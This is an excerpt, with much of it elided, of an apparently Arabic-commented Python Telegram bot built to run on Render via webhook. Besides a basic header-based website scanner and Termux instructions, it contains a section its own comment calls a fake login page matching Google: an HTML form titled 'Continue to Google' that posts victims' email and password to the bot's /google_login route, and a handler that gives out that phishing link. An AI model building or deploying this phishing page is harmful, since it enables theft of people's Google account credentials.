...
مع تفعيل Webhook وحل مشكلة KeyError
"""
...
SERVER_URL = os.environ.get('SERVER_URL', '')  # يجب تعيينه في Render
...
USE_WEBHOOK = os.environ.get('USE_WEBHOOK', 'true').lower() == 'true'  # تفعيل Webhook افتراضياً
...
if not SERVER_URL:
    logger.warning("⚠️ SERVER_URL غير مضبوط. سيتم استخدام رابط placeholder للـ Webhook.")
    # يمكن تعيينه تلقائياً من Render (اختياري)
...
def set_webhook_route():
    if not SERVER_URL:
        return "❌ SERVER_URL غير مضبوط في البيئة", 400
...
# ===================== تقرير فحص الثغرات المُحسَّن =====================
def advanced_website_scan(url):
    """
    تقوم بفحص شامل للموقع وإرجاع تقرير مفصل كما هو مطلوب.
    """
    report = {}
    try:
        ...
        # 3. تحليل الثغرات حسب الترويسات المفقودة
        vulnerabilities = []
        ...
        # 5. بناء التقرير النهائي بالشكل المطلوب
        final_report = "==================================================\n"
...
def perform_vulnerability_scan(target_ip, target_domain, target_url):
    # استخدام دالة advanced_website_scan للحصول على التقرير المفصل
    if target_url:
...
def send_termux_instructions(chat_id, role='user'):
    # استخدام SERVER_URL إذا كان متوفراً، وإلا نستخدم رابط placeholder
...
'''.format(
    ...
    try:
        # استخدام safe_send لإرسال الملف مع التحقق من وجود name
        with open(file_path, 'rb') as f:
            # الحصول على اسم الملف
            file_name = os.path.basename(file_path)
            # إرسال الملف باستخدام send_document مع معالجة الخطأ
...
# ===================== صفحة تسجيل الدخول المزيفة (مطابقة لجوجل) =====================
...
<body>
    <div class="login-container">
        ...
        <p class="subtitle">استمر إلى Google</p>
        <form method="POST" action="/google_login">
            <div class="input-group">
                <input type="email" name="email" placeholder="البريد الإلكتروني أو رقم الهاتف" required>
            </div>
            <div class="input-group">
...
def google_login(message):
    ...
    if chat_id in google_users:
        ...
        return
    # استخدام الرابط المحلي للصفحة المزيفة
    fake_url = f"{SERVER_URL}/google_login" if SERVER_URL else "https://your-server.com/google_login"
...
if __name__ == "__main__":
    ...
    # تعيين Webhook إذا كان SERVER_URL موجوداً
    if SERVER_URL:
        webhook_url = f"{SERVER_URL}/webhook"
        try:
            success = bot.set_webhook(url=webhook_url)
        ...
        logger.warning("⚠️ SERVER_URL غير مضبوط. لن يعمل Webhook.")
        logger.info("🔄 سيتم تشغيل البوت في وضع Polling (غير مستحسن على Render).")
